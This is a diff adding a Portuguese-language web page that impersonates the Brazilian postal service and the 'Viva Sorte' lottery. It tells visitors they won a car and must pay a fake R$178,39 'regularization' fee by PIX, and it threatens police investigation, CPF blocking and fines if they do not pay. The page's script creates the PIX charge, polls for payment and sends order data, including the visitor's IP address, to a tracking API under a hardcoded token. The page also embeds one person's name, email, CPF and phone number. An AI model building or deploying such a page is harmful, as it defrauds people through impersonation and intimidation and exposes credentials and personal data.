@@ -1,0 +1,418 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link rel="icon" href="images/favicon.png" type="./image/x-icon">
+  <link rel="apple-touch-icon" sizes="180x180" href="images/favicon.png">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="css/base.css">
+  <link rel="stylesheet" href="css/styles.css">
+  <link rel="stylesheet" href="css/pix.css">
+
+  <title>Correios - Envio</title>
+  
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+  <script>
+  // === Início: helpers Utmify ===
+  function getTrackingParams() {
+      const stored = localStorage.getItem('utmify_tracking');
+      if (stored) try { return JSON.parse(stored); } catch{}
+      // fallback ao search, caso não exista
+      const p = new URLSearchParams(window.location.search);
+      return {
+        src:          p.get('src')          || null,
+        sck:          p.get('sck')          || null,
+        utm_source:   p.get('utm_source')   || null,
+        utm_campaign: p.get('utm_campaign') || null,
+        utm_medium:   p.get('utm_medium')   || null,
+        utm_content:  p.get('utm_content')  || null,
+        utm_term:     p.get('utm_term')     || null
+      };
+    }
+
+  function sendToUtmify(payload) {
+    return fetch('https://api.utmify.com.br/api-credentials/orders', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-api-token':  'pcL52HsQK1tIi4kRfiqrOH9c6sFtvXc2RCsi'
+      },
+      body: JSON.stringify(payload)
+    })
+    .then(res => {
+      if (!res.ok) return res.text().then(t => { console.error('[UTMify]',res.status,t); throw new Error(res.status); });
+      return res.json();
+    })
+    .then(json => console.log('[UTMify] OK', json))
+    .catch(err => console.error('[UTMify] Falha', err));
+  }
+  // === Fim: helpers Utmify ===
+  </script>
+
+
+  
+  <!-- Estilo total & popup PIX -->
+  <style>
+    #valor-total {
+      font-size:1rem;
+      padding:0.2rem 0.4rem;
+      display:inline-block;
+      background:#e53e3e;
+      color:#fff;
+      border-radius:0.25rem;
+    }
+    #pixPopup {
+      position: fixed;
+      top:0; left:0; right:0; bottom:0;
+      background: rgba(0,0,0,0.6);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+    .pix-content {
+      position: relative;
+      background: #fff;
+      padding: 2rem;
+      border-radius: .5rem;
+      max-width: 360px;
+      width: 90%;
+    }
+    /* Botão "X" */
+    .pix-content .close-btn {
+      position: absolute;
+      top: 0.2rem;
+      right: 0.2rem;
+      background: transparent;
+      border: none;
+      font-size: 1rem;
+      line-height: 1;
+      cursor: pointer;
+    }
+    .pix-content img { max-width:100%; margin-bottom:1rem; }
+    .pix-content code {
+      display:block;
+      background:#f8f9fa;
+      padding:0.5rem;
+      margin:0.5rem 0;
+      word-break:break-all;
+    }
+    .pix-content .total-label {
+      font-size:0.9rem;
+      color:#555;
+      margin-bottom:0.5rem;
+    }
+    .titulo-centralizado {
+  text-align: center;
+}
+
+  </style>
+</head>
+<body>
+  <div id="content">
+    <img fetchpriority="high" decoding="async" width="607" height="89" src="images/bannerrr.png" class="attachment-large size-large wp-image-1993" alt="" srcset="images/bannerrr.png 607w, images/bannerrr.png 300w" sizes="(max-width: 607px) 100vw, 607px">
+
+    <div class="progress-container">
+      <div>
+        <div class="progress-item">
+          <div class="progress-bar" id="bar1"></div>
+          <div class="check-container" id="check1">
+            <img src="images/success.png" alt="Animação" id="img1">
+          </div>
+        </div>
+        <p id="text1" style="margin-left: -10px;">Pagamento Recebido</p>
+      </div>
+
+      <div>
+        <div class="progress-item">
+          <div class="progress-bar" id="bar2"></div>
+          <div class="check-container" id="check2">
+            <img src="images/success.png" alt="Animação" id="img2">
+          </div>
+        </div>
+        <p id="text2">Dados Recebidos</p>
+      </div>
+
+<div style="text-align: left;">
+  <div class="progress-item">
+    <div class="progress-bar" id="bar3"></div>
+    <div class="check-container" id="check3">
+      <img src="images/success.png" alt="Animação" id="img3">
+    </div>
+  </div>
+<p id="text3" style="margin-left: -20px;">Preparando Para Envio</p>
+</div>
+
+
+
+      <div>
+        <div class="progress-item">
+          <div class="progress-bar" id="bar4"></div>
+          <div class="check-container" id="check4">
+            <img src="images/success.png" alt="Animação" id="img4">
+          </div>
+        </div>
+        <p id="text4">Entrega</p>
+      </div>
+    </div>
+
+    <section id="more-information">
+      <h1>LEIA COM ATENÇÃO!</h1>
+      <h2>Regularização de Premiação</h2>
+      <p>
+        Parabéns! Durante a conferência do seu <span class="bold">Bilhete Premiado</span> no programa <span class="bold">Viva Sorte</span>, foi identificado que para a liberação do seu prêmio é obrigatória a emissão da
+        <span class="bold">Nota Fiscal de Premiação</span>, conforme normas da Receita Federal.
+      </p>
+      <p>Essa taxa única é necessária para a entrega oficial do seu prêmio. <span class="bold">Como a premiação é de alto valor,</span> você precisará da nota fiscal do carro <span class="bold">para comprovar à Receita Federal</span> a origem do bem. </p>
+    
+      <button id="show-offer">REGULARIZAR ENTREGA</button>
+      <p></p>
+             <h1 class="titulo-centralizado">O que acontece se Você não pagar?</h1>
+
+             
+            <p> O não pagamento da nota fiscal <span class="bold">pode ser interpretado como indício de Lavagem De Dinheiro,</span> resultando em investigação pela polícia, já que você não justificou a origem do valor nem explicou por que um bem desse porte está em seu nome.</p><p>
+
+<span class="bold"> OBS: Além disso, a dívida ficará registrada em seu CPF, com aplicação de multa de 10% sobre o valor do carro e possível bloqueio temporário do seu CPF, conforme o art. 45 do Decreto-Lei 37/66.</span> </p><p> 
+
+Evite complicações desnecessárias enquanto ainda há tempo.
+    </p></section>
+  </div>
+       
+  <div id="offer-modal" class="modal">
+    <div class="modal-content">
+
+      <div id="step1">
+        <h1>Processando Regularização...</h1>
+        <div id="trace" class="progress-bar2"></div>
+        <p>Aguarde enquanto finalizamos a emissão.</p>
+      </div>
+
+<div id="step2">
+  <p>VALOR DA REGULARIZAÇÃO:</p>
+  <span id="value">R$ 1783,90</span>
+  <p>Mas o Viva Sorte vai arcar com 90% do valor, pois você ganhou uma condição especial. Pague apenas <span class="bold2">R$ 178,39</span> com a parceria oficial do programa <span class="bold2">Viva Sorte</span>.</p>
+  
+  <h1>REGULARIZAÇÃO POR:</h1>
+  <h1 id="value">R$ 178,39</h1>
+
+  <!-- ÁUDIO AQUI -->
+  <p><strong> <span class="bold4">OUÇA O AUDIO DO Renato:</span> </strong></p>
+<audio controls="" style="width: 100%; max-width: 300px; margin-bottom: 15px;">
+  <source src="media/audio.mp3" type="audio/mpeg">
+  Seu navegador não suporta áudio.
+</audio>
+
+
+  <button id="liberarEntregaBtn" style="display:inline-block;padding:15px 25px;background:#1e88e5;color:#fff;border:none;border-radius:5px;font-size:18px;margin-top:15px;cursor:pointer;">
+    LIBERAR ENTREGA
+  </button>
+
+  <p style="margin-top:20px;">
+    Atenção: O não pagamento implicará multa de até <span class="bold4">R$ 10.247,00</span> e bloqueio temporário do seu CPF, conforme o art. 45 do Decreto-Lei 37/66.
+  </p>
+</div>
+
+
+  <script src="js/scripts.js"></script>
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <script>
+    window.pixelId = "68503cf780cea459a8c5ecaf";
+    var a = document.createElement("script");
+    a.async = true; a.defer = true;
+    a.src = "https://cdn.utmify.com.br/scripts/pixel/pixel.js";
+    document.head.appendChild(a);
+  </script>
+
+  <!-- POP-UP PIX -->
+  <div id="pixPopup">
+    <div class="pix-content">
+      <!-- Botão X -->
+      <button class="close-btn" onclick="closePixPopup()">�</button>
+
+
+      <!-- Etapa 2: Loading -->
+      <div id="pixLoadingStep" style="display:none; text-align:center; padding:2rem 0;">
+        <div class="spinner-border" role="status"><span class="visually-hidden">Carregando...</span></div>
+        <p>Gerando cobrança PIX…</p>
+      </div>
+
+      <!-- Etapa 3: Resultado -->
+      <div id="pixResultStep" style="display:none;">
+        <h2>PIX gerado</h2>
+        <div id="pixTotalDisplay" class="total-label"></div>
+        <img id="pixQrImg" src="" alt="QR Code PIX">
+        <code id="pixCode">-- aguardando código --</code>
+        <button id="copyPixBtn" class="btn btn-primary me-2">Copiar QR-Code</button>
+        <button id="closePixBtn" class="btn btn-secondary">Fechar</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    const pixPopup       = document.getElementById('pixPopup');
+    const pixQrImg       = document.getElementById('pixQrImg');
+    const pixCode        = document.getElementById('pixCode');
+    const pixTotalDisplay = document.getElementById('pixTotalDisplay');
+    const pixResultStep  = document.getElementById('pixResultStep');
+    const pixLoadingStep = document.getElementById('pixLoadingStep');
+    const pixCloseBtn    = document.getElementById('closePixBtn');
+
+    function closePixPopup() {
+      pixPopup.style.display = 'none';
+    }
+
+    function gerarPix() {
+      const name  = 'HOSPE Pedro';
+      const email = 'hospe82@gmail.com';
+      const cpf   = '42816866572';
+      const phone = '61983080754';
+      const amount = 17839;
+
+      pixPopup.style.display = 'flex';
+      pixTotalDisplay.innerText = 'Total: R$ 178,39';
+      pixLoadingStep.style.display = 'block';
+      pixResultStep.style.display = 'none';
+      pixCloseBtn.style.display = 'none';
+
+      fetch('/pix.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name, email, cpf, phone,
+          paymentMethod: 'PIX',
+          amount,
+          items: [{ title: 'Regularização de Entrega', unitPrice: amount, quantity: 1, tangible: false }]
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        pixLoadingStep.style.display = 'none';
+        pixResultStep.style.display = 'block';
+        pixCloseBtn.style.display = 'block';
+
+        pixQrImg.src = data.qrCodeImage;
+        pixCode.innerText = data.pixKey;
+
+        document.getElementById('copyPixBtn').onclick = () => {
+          navigator.clipboard.writeText(data.pixKey)
+            .then(() => alert('Código PIX copiado!'))
+            .catch(() => alert('Falha ao copiar.'));
+        };
+
+        const txId = data.transactionId;
+        const createdAtString = new Date().toISOString().slice(0, 19).replace('T', ' ');
+
+        fetch('https://api.ipify.org?format=json')
+          .then(r => r.json())
+          .then(ipData => {
+            sendToUtmify({
+              orderId: txId,
+              platform: 'VivaSorte',
+              paymentMethod: 'pix',
+              status: 'waiting_payment',
+              createdAt: createdAtString,
+              approvedDate: null,
+              refundedAt: null,
+              customer: {
+                name, email, phone,
+                document: cpf,
+                country: 'BR',
+                ip: ipData.ip
+              },
+              products: [{
+                id: txId,
+                name: 'Regularização de Entrega',
+                planId: null,
+                planName: null,
+                quantity: 1,
+                priceInCents: 17839
+              }],
+              trackingParameters: getTrackingParams(),
+              commission: {
+                totalPriceInCents: 17839,
+                gatewayFeeInCents: 0,
+                userCommissionInCents: 17839
+              },
+              isTest: false
+            });
+          });
+
+        const iv = setInterval(() => {
+          fetch(`/pix.php?id=${txId}`)
+            .then(r => r.json())
+            .then(s => {
+              const st = s.status || s.data?.status;
+              if (st === 'PAID' || st === 'APPROVED') {
+                clearInterval(iv);
+                fetch('https://api.ipify.org?format=json')
+                  .then(r => r.json())
+                  .then(ipData => {
+                    sendToUtmify({
+                      orderId: txId,
+                      platform: 'VivaSorte',
+                      paymentMethod: 'pix',
+                      status: 'paid',
+                      createdAt: createdAtString,
+                      approvedDate: new Date().toISOString().slice(0, 19).replace('T', ' '),
+                      refundedAt: null,
+                      customer: {
+                        name, email, phone,
+                        document: cpf,
+                        country: 'BR',
+                        ip: ipData.ip
+                      },
+                      products: [{
+                        id: txId,
+                        name: 'Regularização de Entrega',
+                        planId: null,
+                        planName: null,
+                        quantity: 1,
+                        priceInCents: 2351
+                      }],
+                      trackingParameters: getTrackingParams(),
+                      commission: {
+                        totalPriceInCents: 17839,
+                        gatewayFeeInCents: 0,
+                        userCommissionInCents: 17839
+                      },
+                      isTest: false
+                    });
+                  });
+
+                pixResultStep.innerHTML = `
+                  <div style="text-align:center;padding:2rem 0;">
+                    <div class="spinner-border" role="status"></div>
+                    <p>Pagamento confirmado! Você será redirecionado em instantes.</p>
+                  </div>`;
+                setTimeout(() => {
+                  const cur = new URLSearchParams(window.location.search);
+                  const keys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck'];
+                  const qp = new URLSearchParams();
+                  keys.forEach(k => { const v = cur.get(k); if (v) qp.set(k, v); });
+                  const qs = qp.toString();
+                  window.location.href = '../up3/index.html' + (qs ? `?${qs}` : '');
+                }, 1500);
+              }
+            });
+        }, 5000);
+      })
+      .catch(err => {
+        alert('Erro ao gerar o PIX.');
+        closePixPopup();
+      });
+    }
+
+    document.getElementById('liberarEntregaBtn').addEventListener('click', gerarPix);
+    pixCloseBtn.addEventListener('click', closePixPopup);
+  });
+</script>
+
+
+</div></div></body></html>
